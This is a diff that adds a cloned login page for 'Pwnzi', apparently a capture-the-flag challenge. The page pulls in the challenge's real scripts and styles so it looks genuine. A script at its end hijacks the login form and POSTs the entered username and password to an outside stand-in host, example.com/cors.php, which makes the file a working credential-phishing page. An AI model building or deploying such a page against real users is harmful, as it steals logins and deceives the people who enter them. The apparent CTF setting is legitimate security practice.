@@ -1,0 +1,78 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <title>Pwnzi - Login</title>
+    <link rel="stylesheet" href="https://pwnzi.ctf.spamandhex.com/lib/bootstrap.min.css">
+</head>
+<body>
+    <div id="app"><nav class="navbar navbar-expand-lg navbar-light bg-light">
+	<div class="container"><a href="#" class="navbar-brand">PWNZI</a>
+	<button type="button" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler">
+	<span class="navbar-toggler-icon">
+	</span>
+	</button>
+	<div id="navbarSupportedContent" class="navbar-collapse collapse">
+	<ul class="navbar-nav ml-auto">
+	<li class="nav-item"><a class="nav-link active">Login</a>
+	</li> <li class="nav-item">
+	<a href="profile.html" class="nav-link">Profile</a>
+	</li> <li class="nav-item">
+	<a href="investment.html" class="nav-link">Investments</a>
+	</li> <li class="nav-item"><a href="report.html" class="nav-link">Report</a></li></ul></div></div></nav> 
+	<main class="login-form pt-5"><div class="container"><div class="row justify-content-center">
+	<div class="col-md-8"><div class="card">
+	<div class="card-header">Login / Register</div> 
+	<div class="card-body"><form><div class="form-group row">
+	<form id='myForm' >
+	<label for="input-username" class="col-md-4 col-form-label text-md-right">Username</label> <div class="col-md-6">
+	<input type="text" id="input-username" name="username" required="required" autofocus="autofocus" ></div></div> <div class="form-group row">
+	<label for="input-password" class="col-md-4 col-form-label text-md-right">Password</label> <div class="col-md-6">
+	<input type="password" id="input-password" name="password" required="required" ></div></div> 
+	<div class="col-md-6 offset-md-4"><button type="submit">Login</button> 
+	</form>
+	<button type="button" id="button-register" class="btn btn-secondary">Register</button></div></form></div></div></div></div></div></main></div>
+
+    <script src="https://pwnzi.ctf.spamandhex.com/lib/vue.js"></script>
+    <script src="https://pwnzi.ctf.spamandhex.com/pwnzi.js"></script>
+    <script src="https://pwnzi.ctf.spamandhex.com/login.js"></script>
+    <!-- https://pwnzi.ctf.spamandhex.com/pwnzi.jar -->
+
+
+
+<script>
+window.addEventListener( "load", function () {
+  function sendData() {
+    const XHR = new XMLHttpRequest();
+
+    // Bind the FormData object and the form element
+    const FD = new FormData( form );
+
+    // Define what happens on successful data submission
+    XHR.addEventListener( "load", function(event) {
+      alert( event.target.responseText );
+    } );
+
+    // Define what happens in case of error
+    XHR.addEventListener( "error", function( event ) {
+      alert( 'Oops! Something went wrong.' );
+    } );
+
+    // Set up our request
+    XHR.open( "POST", "https://example.com/cors.php" );
+
+    // The data sent is what the user provided in the form
+    XHR.send( FD );
+  }
+ 
+  // Access the form element...
+  const form = document.getElementById( "myForm" );
+
+  // ...and take over its submit event.
+  form.addEventListener( "submit", function ( event ) {
+    event.preventDefault();
+
+    sendData();
+  } );
+} );
+</script>
+</body>
+</html>
